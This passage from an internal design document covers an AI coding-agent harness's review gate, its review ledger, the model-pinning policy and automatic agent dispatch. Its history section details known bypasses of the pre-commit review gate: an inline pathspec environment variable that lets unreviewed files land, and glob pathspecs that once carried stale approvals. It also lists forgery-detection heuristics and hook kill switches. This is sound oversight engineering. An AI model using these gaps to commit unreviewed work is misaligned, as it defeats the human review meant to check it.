the time this landed: 114 such calls, every one a silent no-op). Both shapes now raise
`ArgvError` (defined in `record_review.py`) instead, caught in exactly one place, `main()` — a bad
invocation is refused with an explicit message and nothing recorded, never a quiet no-op.
`--model`/`--round`/`--vf`/`--prev`/`--tier` are likewise validated against their own closed value
sets or types and raise the same way on an invalid value. `--reviewer` is the one exception: an
invalid character (`#`, which would otherwise fake a compound-identity boundary — see the
`reviewer=` bullet above) is silently *sanitized*, not rejected, so a malformed `--reviewer` value
still records rather than raising `ArgvError`.

**Idempotency and update semantics** (`decide()` in `record_review.py`): recording the
*same* outcome twice for the same HEAD is a no-op (`already`). Recording a *different* known
outcome (e.g. a re-review after fixes now reports clean) **updates the ledger's entry for that
HEAD in place** rather than duplicating it. The one asymmetry: an unspecified/unknown outcome
call **never** overwrites an existing known outcome — a naive bare invocation can't silently
downgrade a recorded `blockers:4` back to "unknown."

### `plan_reviews.jsonl` line shape

Simpler and append-only — no update-in-place logic, because a plan is reviewed once per
revision in practice and nothing gates on this file's content (it's pure audit trail):

```json
{"ts": "...", "repo": "...", "plan": "...", "outcome": "clean"|"blockers", "blockers": <n>}
```

Recorded via:

```
python3 ~/.claude/hooks/record_plan_review.py <repo> --clean --plan <path>
python3 ~/.claude/hooks/record_plan_review.py <repo> --blockers <n> --plan <path>
```

## `model_policy.json` / `model_policy.md`: the machine-readable policy behind the ladder

`~/.claude/knowledge/model_policy.json` is the single source of truth (`model_policy.md` is
explicitly documented as its stale-if-they-disagree companion explanation). Structure (the file's own `version` field
carries its date stamp):

- **`task_defaults`** — a tier per *kind of work*, not per agent: `poll_report`/`mechanical`/
  `drafting`/`sweeps`/`research_reading`/`browser_driving` sit on `haiku`/`sonnet`;
  `review_boundary`/`ranked_judgment`/`hard_debugging` sit on `opus`.
- **`agent_pins`** — every named runtime agent fixed to a specific model. The reviewers
  (`code-reviewer`, `plan-reviewer`), the oversight auditors, the department orchestrators and the
  sanctioned-Opus specialist seats listed in `CLAUDE.md` §10/§13 are pinned `opus`; implementers,
  mechanical agents, drafters and the scheduled watchers sit on `sonnet` or `haiku`. The
  `agent_pins` object in the file is the table; the split was 25 `opus`, 25 `sonnet` and 3 `haiku`
  when this page was last checked (2026-10-13), so re-derive it by counting the values rather than
  trusting the numbers. This is what stops a dispatch from silently inheriting whatever model the
  *parent* session happens to be running, the exact failure mode `CLAUDE.md` §1 warns about for
  unpinned catch-all agents.
- **`escalation`** — three named rules, quoted verbatim because they're policy, not
  implementation detail:
  - `on_churn`: "same task failing twice on the cheap tier goes to the capable tier on attempt
    three; never a third cheap retry."
  - `on_demoted_reasoning`: "a finding demoted in verification for reasoning quality re-runs one
    tier up."
  - `de_escalate`: "work a capable model has stabilized into a repeatable recipe moves down one
    tier after one calibration comparison."
- **`session_rules`** — `scheduled_session_model: "sonnet"`, `no_unattended_opus_loops: true` (an
  unattended job can't quietly default to an expensive model with nobody watching spend), and
  `review_ladder`, a five-item list that *is* this document's own subject matter in policy form:
  `"risk-tier trivial => cheaper-model confirmatory pass"`; a `batch reviews` item (one full review
  per big unit, fix all findings in parallel, then targeted checks scoped to the whole change since
  review until clean, with the 3-strike stop; a check becomes full only on a broad or risky fix or a
  risk-tier or reviewer-of-record change; the old two-targeted cap and high-tier re-escalation are
  retired); `"one reviewer per boundary - substitution never stacks"`; `"plan review only for
  substantial plans"`; and `"code-review full re-review rounds run warm - continue the round-1
  reviewer, full scope, cold dispatch is the fallback, max two consecutive warm rounds per boundary;
  a risk-tier or reviewer-of-record change breaks the warm chain"`.
- **`effort_defaults`** — an effort level per kind of work, applied through the Workflow tool's
  `agent()` options (the Agent dispatch tool exposes no per-dispatch effort parameter on this
  client): `poll_report` is `low`; `mechanical`, `sweeps`, `drafting`, `research_reading` and
  `browser_driving` are `medium`; `review_boundary`, `ranked_judgment` and `hard_debugging` are
  `high`.

`~/.claude/hooks/model_pin_parity.py` (report-only, not a blocking gate) validates that every
agent file under `~/.claude/agents/` actually declares the model this policy pins it to, and
separately checks the sanctioned-Opus extension set here against `CLAUDE.md` §13's own oversight
roster table — so the machine-readable policy and the human-readable contract can't silently
diverge from each other (`model_policy.md`'s own "Who consumes model_policy.json" section).

## Automatic agent call-in (router, path hints, Stop obligations) — added 2026-09-28

Operator: "i want agents to be called on or initiated mechanically when/where reasonable and
possible." Design: agentic-systems-architect, 2026-09-28. Three pieces, all text-only (no model
call, no dispatch, no operator card), all fail-open:

1. **Agent descriptions** (`agents/*.md` `description:`): "Use when <trigger>. <lane>. Not for
   <confused lane> (use <agent>)." Claude Code auto-delegates from these. Guarded by
   `hooks/tests/test_agent_descriptions.py` (≤300 chars each, ≤14K total, "Use proactively" only on
   plan-reviewer, agentic-systems-architect, trust-architect, no bare everyday trigger words).
2. **Prompt router** (`hooks/agent_router.py`, UserPromptSubmit): regex rules in
   `knowledge/agent_triggers.json` → one advisory line naming the agent. Silent on no match, on machine
   text (compaction summaries, scheduled prompts, >2,000 chars), when the prompt already names the
   agent, when that agent was already dispatched this session, and after one hint per agent per
   session. Tuned on a 30-day replay of 2,501 operator messages (≈1% fire rate).
3. **Path hints + Stop obligations** (opt-in: the public repo's template `settings.json` does not wire these or the prompt router; this runtime's own does) (`hooks/agent_router_path.sh` → `agent_router.py --path` on
   PostToolUse Write|Edit|MultiEdit; `hooks/agent_obligations.py` on Stop): editing an agent
   definition (→ agentic-systems-architect review + scorecard card) or writing a plan-named file
   (→ plan-reviewer; the plan rule matches plan-named FILES — not folder names — under a plans
   directory and skips handoffs, verdicts, reports, briefs, facts, findings and summaries) records an
   obligation; a KB file gets a claims-verification hint only. At Stop, an
   open obligation blocks ONCE; it clears on a completed or in-flight dispatch of the agent after the
   first edit, the plan-review ledger, or the file returning to HEAD. `stop_hook_active` always allows, and the reason tells the model to say so and stop if the file is
   not actually a plan or agent definition.

Kill switches: `CSA_DISABLE_HOOKS=1` (all hooks) or `touch ~/.claude/.router_off` (these only).
State: `~/.claude/.agent_router_state/` and `~/.claude/.agent_obligations/` (gitignored, per session).
Gate 3b also names the reviewer of record: a repo's `.claude/oversight/trust_surface.json` (or
`manifest.json` `security.trust_surface_globs`) makes the unreviewed-commit denial name
trust-architect. It only names the reviewer; which reviewer ran is still not enforced (§10 gap).

## History

<details>
<summary>History</summary>

These are the dated corrections, fix-round narratives and machine-state notes that used to sit
inline in the sections above. They are kept word for word, in their original order, grouped under
the section they came from. They are a record, not the rule: where one of them disagrees with the
sections above, the sections above are current.

### From `--rekey`: the GH #5886 pathspec fix rounds (2026-09-23 to 2026-09-24)

**Directory, glob, and pathspec-magic entries reconstruct correctly (fixed 2026-09-23,
#5886, across three review rounds).** An earlier version of this section called
the file-pathspec-only behavior a deliberate limitation: a `--paths` entry that named a DIRECTORY
could never be partitioned, so `--rekey` always refused for it. That was never a design choice —
it was three real defects (two in the reconstruction's membership logic, one in the byte-identity
proof itself), fixed across three rounds.

Round 1 fixed the tracked-diff half: it now excludes force-untracked FILES via git's own
`:(exclude,literal)<path>` pathspec magic instead of filtering the raw (possibly-directory)
pathspec entries themselves, so a directory pathspec no longer double-counts its just-staged files
against the separately-appended untracked material. **The `,literal` modifier is load-bearing, not
decorative:** a bare `:(exclude)<path>` is a glob by default, so a force-untracked path whose
literal filename contains a glob character (`*`, `?`, `[`, or the `\` glob escape) would make the
exclude match every path the pattern expands to — including a DIFFERENT, tracked, modified, matched
sibling never part of the force-untracked set — dropping that sibling's content out of the
reconstruction entirely and letting the byte-identity check succeed over a commit that actually
contains an unreviewed edit. `,literal` disables every glob and magic interpretation so the exclude
matches only the exact path string; escaping individual characters is not a substitute (round 1
verification measured the `\` escape over-excluding a sibling). Known fail-closed limitation, from
round 1, still true of `,literal` itself in isolation: `GIT_LITERAL_PATHSPECS=1` in the environment
makes the exclude a no-op, so a reconstruction relying on it alone would refuse (one extra review,
never a false accept) rather than silently miscompute. **As of fix-round-4 (R6-B2, see below), this
never actually gets exercised** -- `decide()`/`record_review.py` refuse the commit OUTRIGHT the
moment `GIT_LITERAL_PATHSPECS` (or any of its three siblings) is present, before any reconstruction
or digest is attempted at all -- this paragraph's own fail-closed behavior is now a backstop under a
backstop, not the operative check.

Round 1 shipped WITH an in-repo Python helper (`_entry_covers_name`, matching an exact string or a
real on-disk directory prefix) deciding the *other* half — which names got RE-ADDED to the
untracked material. A cold round-2 review found this was membership decided **twice**, by two
different arbiters that could disagree: git decided the tracked-diff exclusion using its own
pathspec matching, but the Python helper decided the untracked re-add using a narrower vocabulary
that understood nothing about git pathspec syntax itself. A name matched only through a glob
(`src/*.py`), pathspec magic (`:(top)evil.py`), or the bare root pathspec (`.`) was excluded from
the tracked half by git, then rejected by the Python helper on the untracked-re-add half —
vanishing from the reconstruction entirely. A never-reviewed file matched only this way could be
staged alongside a genuinely reviewed one, and `--rekey` would carry the stale clean outcome onto
content that never included it. Reproduced end to end through the real CLI with `src/*.py`,
`a.py evil*`, `a.py :(top)evil.py`, and `.` as the `--paths` pathspec, and through the gate's own
printed `--rekey` hint leading straight into it.

**Fixed by letting git decide BOTH halves, never a Python approximation of either.**
`_entry_covers_name` and its sibling `_names_covered_by_entries` are deleted outright. The
untracked set to re-add is simply `real_untracked (git ls-files --others, scoped to the pathspec)
UNION force_untracked` — and `force_untracked` is itself always derived from git's own
`diff --name-status` added-paths list under that SAME pathspec (`_added_paths`), never a
caller-supplied guess. This is safe, not merely permissive: a name reaching `force_untracked` was
already proven, by git, to be both matched by the pathspec and genuinely new relative to HEAD. The
SHA256 byte-identity check, the plain-regular-file mode check, AND the lossless-material check
(above) together are the actual safety boundary — membership widened here only decides WHICH names
get a fair, git-accurate chance to reconstruct their real content; it never on its own proves a
given name's content in the reconstruction is COMPLETE or correctly decoded, which is exactly what
the lossless-material check exists to catch. A directory, glob, or magic-shaped pathspec still
refuses on any real content difference, exactly like a plain file path always did.

**Fix-round-3 M1 tried stripping `GIT_LITERAL_PATHSPECS`/`GIT_GLOB_PATHSPECS`/`GIT_NOGLOB_PATHSPECS`/
`GIT_ICASE_PATHSPECS` from `precommit_review_gate._git`'s OWN subprocess environment. A COLD
fix-round-4 (R6-B2) review found this was a REGRESSION AGAINST HEAD and reverted it — the claims
made for it did not hold up under a live repro:**

- *"digests disagree only in the ambient-persistent-var case, never a false accept"* — FALSE.
  Live-reproduced (`e24.py` in the round-4 review's own repro set): a commit run with
  `GIT_LITERAL_PATHSPECS=1` set AMBIENTLY for the WHOLE Python process running the hook
  (`assert os.environ.get("GIT_LITERAL_PATHSPECS") == "1"` at module scope in `e24.py` — the shape of
  a variable already present in Claude Code's own launch environment; an `export` in the Bash
  tool's shell never produces this shape (see the fix-round-8 B1 correction below), and it is not
  the inline-on-the-commit-line case either — **corrected 2026-09-24, R7-B2: an
  earlier version of this bullet described `e24.py` as "the SAME shell invocation as the commit
  itself (not a separately-persisted export)," which mischaracterized what `e24.py` actually sets
  up and is fixed here.**). HEAD — which never touches the git-subprocess environment at all —
  correctly DENIES this commit, because HEAD's own digest computation inherits the identical var
  from the SAME process environment the real commit will run in, and reads the pathspec identically.
  The round-3 STRIPPED version instead computed its digest under git's DEFAULT pathspec semantics
  (having removed the var from its own calls), while the real `git commit` — whose subprocess still
  saw the var in ITS environment — interpreted the pathspec differently. The gate ALLOWED a commit
  HEAD would have DENIED: a false accept whenever such a variable is present in the hook's launch
  environment.
- *"closed structurally by this module's architecture"* — **corrected 2026-09-24, R7-B2: an earlier
  version of this bullet called this claim "misapplied" and salvaged half of it ("does close the
  INLINE-PREFIX-ON-THE-COMMAND-LINE vector specifically"). That salvaged half is ITSELF false, not
  merely misapplied, and is retracted here rather than repeated.** The real, true architectural fact
  (this module re-derives a pathspec from parsed command tokens and never executes the raw command
  text) is exactly WHY this module can never see an inline `VAR=value` prefix typed on the commit
  line at all — that is what leaves the inline vector OPEN, not what closes it. `e21.py` (fix-round-4
  R7-B1/R7-B2's own repro) demonstrates this live: `GIT_LITERAL_PATHSPECS=1 git commit -m x --
  ':(top)x.py'`, run as one shell invocation with the var set only inline on that command, is ALLOWED
  by HEAD and by every round-4 fix candidate, landing an unreviewed file. See the "**What refusing
  removes, precisely, and what it explicitly does not**" paragraph below for the full, current,
  non-retracted account.
- *"the runtime's shell profiles are not known to set any of these four vars, so this is a
  defended-against edge case, not a live one"* — **corrected fix-round-8 B1: an earlier version of
  this bullet called `e24.py` "the ordinary same-invocation env-var-assignment scenario," which
  contradicts the corrected bullet above (`e24.py` sets the var AMBIENTLY, at module scope, in the
  hook's OWN process — it is the pre-existing-launch-environment case, not a shell `export` in any
  invocation, and not an inline prefix).** The claim above described only the case where the var is
  already present in the hook's own inherited environment before any gated command runs; it never
  addressed (and round 3 never tested) whether a var set BY the gated command itself — inline, or
  via `export` earlier in the same shell invocation — reaches the hook. It does not, in either
  shape (`e21.py`, `e2e/x4.py`, fix-round-8 B1) — that is the still-open #5892 class the
  "What refusing removes" paragraph below now states plainly.
- A reference to `core.literalPathspecs` as an alternative, still-effective safety net — there is no
  such git config key; this was invented and should never have been cited.

**Corrected 2026-09-24 (GH #5886 fix-round-4, R7-B2, cold trust-architect review): the paragraph
below previously claimed refusing-when-set closes the INLINE vector too. That claim is FALSE and is
corrected here, not merely flagged — `pathspec_env_vars_present()` reads `os.environ`, which an
inline `VAR=value` prefix on the commit line (`GIT_LITERAL_PATHSPECS=1 git commit -m x -- path`)
never populates for the HOOK's own process: the shell sets that assignment only in the environment
of the `git` child process it spawns, never in the PreToolUse hook's own environment, which sees the
unmodified command STRING and must parse it as text to notice the prefix at all. `e21.py` (fix-round-4
R7-B1's own repro set) demonstrates this live: an inline `GIT_LITERAL_PATHSPECS=1` prefix on the
commit line is ALLOWED by both HEAD and this fix, and an unreviewed file (`:(top)x.py`, matched only
under literal-pathspec semantics) lands. This is a real, demonstrated-live gap, not a hypothetical —
see `_PATHSPEC_ENV_VARS`'s own code comment in `precommit_review_gate.py`, which states this
correctly; this doc previously stated the opposite. Tracked as #5892.**

Also fixed in round 4: `record_review.py`'s module docstring previously called the byte-identical
SHA256 check ALONE "the actual safety boundary" for `--rekey`. That was already inaccurate as of
round 3 (the lossless-material check is equally load-bearing — see above) and is corrected in the
module text itself, not just in this doc.

### From "The fix-round discipline": the per-round ladder, superseded by batch reviews (2026-10-09)

The contract (`CLAUDE.md` §10) states that batch reviews replace these round-count rules; their
recording mechanics are still described in the sections above.

`CLAUDE.md` §10 (2026-08-20 addition) is explicit that round 1 of any review is full adversarial
Opus, but re-running a full Opus pass on *every* subsequent fix-and-recheck round is the wrong
default. Once round 1 finds blockers and they're fixed, the default next step is a **narrow,
targeted verification** — the same falsifiability discipline `CLAUDE.md` §6 requires everywhere
else: does a test go red without the specific fix and green with it, for exactly the reported
defect, with the existing suite still green overall.

Escalate back to a **full** re-review only when any of:

- The fix touches broad or risky logic beyond the narrow reported line.
- Two targeted-verification rounds have already passed without a full re-review (a hard cap, so
  a chain of narrow fixes can't quietly substitute for review forever).
- The diff's risk tier is `high`.

### From the warm-round paragraph: the sentence saying nothing enforces the warm cap

Superseded: `record_review.py` has refused a third consecutive warm round since the correction
recorded in `CLAUDE.md` §10 on 2026-09-04. The text above was corrected on 2026-10-13.

Like the
targeted-round cap, nothing records or enforces the warm cap today — track it in the conversation
(a `--warm` ledger dimension is on the #4686 follow-up list).

### From the review-round ceiling: the overcount correction (issue #5828)

The section heading was: "OVERCOUNT is also reachable — the unsafe direction, and an earlier version
of this doc claimed it was not".

**Correcting a false claim rather than deleting it**, because it was stated here confidently and
acted on. This section previously said undercounting was the ONLY direction and that a false HIGH
round "could never trigger a would-refuse for a chain that never ran that long." That is FALSE.

`paths_overlap` is union semantics: a call overlaps an entry if ANY path matches. So INDEPENDENT
chains that merely share one path are walked as a single chain. Reproduced directly — five
unrelated features, each with one blockers round, each touching `README.md`; a **brand-new sixth
feature's FIRST review derives round 6** and logs `total-round-cap-would-refuse`. True round: 1.

**The RULE, not the list** — stated this way because the enumeration kept growing, the same lesson
already applied to the spelling list above: overlap is union semantics evaluated in BOTH directions
against `paths=` telemetry, so ANY shared path merges chains, regardless of which side is broad.

That is reachable from the CALLER's pathspec — a shared hot file (`README.md`, `CLAUDE.md`), a
directory-scoped commit overlapping every sibling chain beneath it, a multi-path commit spanning two
open chains — and equally from the RECORDED side, which an earlier version of this section missed
entirely:

- **A directory-scoped pathspec in an EARLIER entry captures every later single-file call beneath
  it.** The caller names one brand-new file; no shared hot file, no directory in their own pathspec,
  no multi-path commit — none of the caller-side shapes applies, and it still overcounts.
  Reproduced: three entries recorded against `modules/estimate_engine_v3`, then a first review of
  `modules/estimate_engine_v3/brand_new_file.py` derives **4**. The live ledger carries **48
  distinct directory-shaped recorded paths** (`repo_tooling/demo_video` ×5,
  `_scripts/git-hooks/pre-push` ×10, `repo_tooling/google_ads` ×4, …), so this is live, not latent.
- **A multi-path "bridge" entry transitively merges two chains that never shared a path.** Chains
  `[x.py]` and `[y.py]` are independent until some entry records `[x.py, y.py]`; a later call of
  `['x.py']` alone then inherits y.py's rounds through the bridge. Reproduced: derives **3**.

A replay of the live 4,752-line ledger found **19 entries that would log a tripwire and 1 a
total-cap crossing**, with a peak derived round of 6 on a 9-path spec where 4 members independently
derived 6 and 5 derived 1 — the same commit, two answers.

**Consequence for the pre-enforcement fix:** it is broader than "special-case shared files."
Because both sides are evaluated, no fix that inspects only the caller's pathspec can be complete.

### From the `last_reviewed` grammar: a machine-state note about `battery:` lines

No live
  `battery:` line exists on this machine's ledger as of 2026-08-30 (verify:
  `grep -c '^battery:' ~/.claude/.review_state/last_reviewed` → `0`);

### From "The reviewing model is derived, not declared": the recipe-rollout file list (2026-09-20)

**Recipe rollout.** The same recorder change is functional the moment it lands, but every documented
recipe that calls `record_review.py --pre-commit` still needs to actually pass
`--reviewer-tool-use-id`/`--reviewer-agent-id` for the join to have anything to work with — a
recipe that only passes `--reviewer <type>` degrades to the warn-only `no-identity` path, not a
join. Updating those recipes is explicitly OUT OF SCOPE for this step (master plan §2.4: "the same
change updates every documented recipe" is its own, separate, ≥3-commit follow-up, landing before
the warn-only window's step-2 refusal gate). The files a `grep -rl record_review.py` finds across
both repos, as of 2026-09-20 (16 in `~/.claude`, plus this product repo's `dev-runtime.md` = 17 —
re-derive rather than trust this count, it will drift):
`CLAUDE.md`, `agents/code-reviewer.md`, `agents/git-ops.md`, `agents/session-coordinator.md`,
`agents/trust-architect.md`, `commands/sweep.md`, `docs/agents/code-reviewer.md`,
`docs/subsystems/codex-review.md`, `docs/subsystems/gate-chain.md`,
`docs/subsystems/review-ladder.md` (this file), `docs/subsystems/telemetry-and-spend.md`,
`knowledge/oversight_install.md`, `knowledge/review_gate_incident_history.md`,
`knowledge/worktree_integration_flow.md`, `schedules/prompts/daily_sweep.txt`,
`schedules/prompts/issue_wheel.txt` (all under `~/.claude`), plus the product repo's
`.claude/oversight/dev-runtime.md`. None of these were edited by step 1 (the recorder change);
the WS2.4 recipe follow-up described above is landing against them now, and this file's own
"Clearing the gate" and targeted-round recipes, plus `gate-chain.md`'s gate 3c recovery chain,
already carry the reviewer-identity triple.

### From "model_policy.json": the 2026-09-01 snapshot of pins and session rules

The file has since changed (new pins, a newer `version`, and the batch-reviews item in
`review_ladder`); the sections above describe it as it stands now.

- **`agent_pins`** — every named runtime agent fixed to a specific model: `code-reviewer`,
  `plan-reviewer`, `launch-director`, `test-architect`, `trust-architect`,
  `agentic-systems-architect`, `code-quality-architect`, `marketing-director`,
  `admin-portal-architect` are all pinned `opus`; the rest
  (`browser-ops`, `ci-monitor`, `explore`, `git-ops`, `implement`, `test-runner`,
  `test-writer`, `board-steward`, `sentinel`, `consistency-auditor`, `product-qa`,
  `design-reviewer`) sit on `sonnet` or `haiku`. This is what stops a dispatch from silently
  inheriting whatever model the *parent* session happens to be running — the exact failure mode
  `CLAUDE.md` §1 warns about for unpinned catch-all agents.

- **`session_rules`** — `scheduled_session_model: "sonnet"`, `no_unattended_opus_loops: true`
  (an unattended job can't quietly default to an expensive model with nobody watching spend), and
  `review_ladder`, a five-item list that *is* this document's own subject matter in policy form:
  `"risk-tier trivial => cheaper-model confirmatory pass"`, `"fix rounds => targeted
  verification by default; ladder escalates to full re-review on broad fix /
  two-consecutive-targeted-rounds cap /
  high tier"`, `"one reviewer per boundary - substitution never stacks"`, `"plan review only for
  substantial plans"`, and `"code-review full re-review rounds run warm - continue the round-1
  reviewer, full scope, cold dispatch is the fallback, max two consecutive warm rounds per
  boundary; a risk-tier or reviewer-of-record change breaks the warm chain"` (2026-08-30,
  #4686).

### Where the code and `CLAUDE.md` agree — and the one open disagreement (2026-08-30)

The section heading was: "Where the code and `CLAUDE.md` agree — and the one open disagreement". The
warm-chain auditor exemption it describes is still described in the warm-round paragraph above.

Cross-checking this subsystem's code against the live `CLAUDE.md` §10 text found no substantive
disagreement in the core mechanism: the digest-keying, the fail-open behavior, the risk-tier
definitions (including the deliberate `trivial` exclusion of test-only changes), the fix-round
escalation triggers, the substitution-never-stacking rule, and the sanctioned-Opus roster all
match between prose and code. One minor, self-disclosed gap: `CLAUDE.md`'s high-risk pattern
list omits an explicit `.github/` mention the code does gate on — not a contradiction, since the
prose defers to the module for the full list.

**One NAMED, OPEN disagreement as of 2026-08-30 (tracked as a blocking follow-up on CSA
#4686):** `hooks/audit_review_attribution.py` encodes "a legitimate review dispatch is used
exactly once — a pair cited twice is the cheapest possible forgery," and time-windows its lease
matching (default 1800s). The warm-re-review rule above makes both halves false by construction
for a legitimate warm chain (it re-cites round 1's identity pair, possibly hours later). Until
that auditor learns the exemption (successive `round=` values on one `prev=`-linked chain for
pair-reuse, plus the lease-time window for a re-cited round-1 identity), its `reused`/`unmatched`
verdicts need the warm-chain carve-out applied: Exempt ONLY (i) a `reused` or `unmatched` verdict
on an entry that is a successive `round=` value on a `prev=`-linked chain, where — for
`unmatched` — the cited (agent_id, tool_use_id) pair EXISTS somewhere in
`~/.claude/.agent_budget/spend.jsonl` (window-ignored; a pair that appears NOWHERE is a real
mismatch and is always relayed); and (ii) a `reused` or `unmatched` verdict on a warm-shaped entry whose ledger `ts=` predates
2026-08-31 (the field mandate's landing date) — a hard date, never "before the mandate existed".
Everything else in the verdict classes STANDS and is relayed — a `no-identity` entry is NEVER
exempt on this ground alone. A warm round's re-cited identity is the expected shape, not the
forgery signal.

### Re-verification, 2026-10-13

Re-checked against the code and the contract for the restructure that produced this page's current
layout. `record_review.py` enforces the warm cap (`_MAX_CONSECUTIVE_WARM_ROUNDS`,
`warm-cap-exceeded`); `knowledge/model_policy.json` carries the batch-reviews item in
`session_rules.review_ladder` and an `effort_defaults` block; `CLAUDE.md` §10 states that batch
reviews replace the earlier round-count rules. `audit_review_attribution.py` still documents the
warm-round `prev=`/`round=` auditor exemption as pending (#4686), so that open follow-up stays
described above. The line-number citations that remained on this page were replaced with symbol
names, the page's own stated convention.

### Statements corrected in place during the 2026-10-13 restructure

Each quoted statement below was replaced in the sections above because it no longer matched the code or the contract.

> (the cap counts full rounds only; a COLD full round resets it)

Any entry recorded without `--warm` ends the run, not only a cold full round; the replacement
states the exact rule from `record_review.py`.

> `code-quality-architect`) adds bounded periodic *audits*

The sanctioned-Opus list was given as five seats; the contract's list is much longer now (department
orchestrators and the GTM and venture seats).

> Reading real, live lines from this
> machine on 2026-08-30 confirms both:

The lead-in made a claim about one machine's live ledger.

> and nothing in the codebase mechanically
> enforces the two-round cap today (`record_review.py`'s comments say this plainly: track the round
> count in the conversation).

The sentence described the two-targeted-round cap as a live rule that only the conversation tracks;
batch reviews retired that cap.

> Structure, as it
> exists on disk today (`version: "2026-09-01"`):

The sentence pinned the description to `version: "2026-09-01"`; the file has since moved on.

</details>
